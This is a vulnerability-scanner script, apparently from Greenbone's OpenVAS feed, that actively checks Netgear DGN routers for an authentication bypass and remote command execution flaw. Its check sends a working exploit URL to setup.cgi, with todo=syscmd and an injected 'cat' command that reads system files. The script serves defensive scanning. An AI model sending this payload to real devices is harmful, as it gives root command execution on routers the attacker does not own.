# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103728");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2024-12847");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-06-04 11:47:22 +0200 (Tue, 04 Jun 2013)");
  script_name("Netgear DGN Devices Authentication Bypass/RCE Vulnerability (Jun 2013) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  # nb: No dependency to gb_netgear_dgn2200_http_detect.nasl or gb_netgear_dgnd3700_http_detect.nasl
  # as other devices might be affected as well.
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("NETGEAR_DGN/banner");

  script_xref(name:"URL", value:"https://seclists.org/bugtraq/2013/Jun/8");
  script_xref(name:"URL", value:"https://packetstorm.news/files/id/121860");
  script_xref(name:"URL", value:"https://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/25978");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/43055");
  script_xref(name:"URL", value:"https://isc.sans.edu/diary/The+Curious+Case+of+a+12YearOld+Netgear+Router+Vulnerability/31592");
  script_xref(name:"URL", value:"https://www.crowdsec.net/blog/netgear-rce-and-how-vulnerabilities-persist-in-the-wild");
  script_xref(name:"URL", value:"https://isc.sans.edu/diary/PCAPs+or+It+Didnt+Happen+Exposing+an+Old+Netgear+Vulnerability+Still+Active+in+2025+Guest+Diary/31638");

  script_tag(name:"summary", value:"Netgear DGN devices are prone to an authentication bypass and a
  remote command execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"These vulnerabilities were known to be exploited by the IoT
  Botnet 'Reaper' in 2017.");

  script_tag(name:"impact", value:"Attackers can leverage this vulnerability to bypass existing
  authentication mechanisms and execute arbitrary commands on the affected devices, with root
  privileges.");

  script_tag(name:"affected", value:"- Netgear DGN1000 devices versions prior to 1.1.00.48

  - Netgear DGN2200 devices in version 1

  - Other DGN device version / models might be affected as well");

  script_tag(name:"solution", value:"- Netgear DGN1000: Update to version 1.1.00.48 or later

  - Netgear DGN2200: No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product
  by another one.

  - Other DGN devices: Please contact the vendor for more information");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);

# nb: The "." shouldn't be escaped, see 2017/gb_netgear_cve_2016_5649.nasl for more info.
if(!banner || banner !~ 'Basic realm="NETGEAR.DGN')
  exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/" + file + "&curpath=/&currentsetting.htm=1";
  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
